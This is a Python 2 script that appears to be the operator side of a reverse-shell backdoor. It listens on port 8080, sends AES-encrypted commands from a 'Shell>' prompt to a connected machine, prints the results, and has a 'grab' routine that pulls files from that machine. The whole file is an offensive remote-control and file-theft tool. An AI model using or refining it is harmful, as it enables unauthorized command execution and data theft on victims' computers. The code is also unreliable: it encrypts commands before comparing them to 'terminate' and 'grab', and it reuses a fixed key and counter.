"""
    AES is Symmetric Encryption which uses a same key for encryption and decryption
    on both sides.
"""
import socket
import os
from Crypto.Cipher import AES

counter = "H"*16
key = "H"*32

def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda:counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda:counter)
    return decrypto.decrypt(message)

def transfer(conn, comm):
    conn.send(comm)
    f = open('/root/Desktop/test.png','wb')
    
    while True:
        bits = conn.recv(1024)       # grab the file in bits
        if 'Unable to find the file' in bits:
            print('[+] Unable to find out the file')
            break
        if bits.endswith('DONE'):
            print('[+] Transfer completed')
            f.close()
            break
        f.write(bits)
    f.close()
    
            

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("",8080))                       # binding the connection to the tunnel
    s.listen(1)                          # backlog value
    conn, addr = s.accept()
    print("[+] Got a connection from ", addr)

    while True:

        comm = raw_input("Shell> ")
        comm = encrypt(comm)

        if comm == "terminate":
            output = 'terminate'                      # terminate the connection
            #conn.send(output.encode('utf-8'))           # In python3 unicode characters can be send            
            conn.send(output)
            conn.close()
            break
        elif 'grab' in comm:                 # grab*fucker.exe
            transfer(conn,comm)
        else:
            #conn.send(comm.encode('utf-8'))          # encoding to utf-8 for python3
            conn.send(comm)
            print(decrypt(conn.recv(1024)))                  # if connected get the first KB


def main():
    connect()


main()
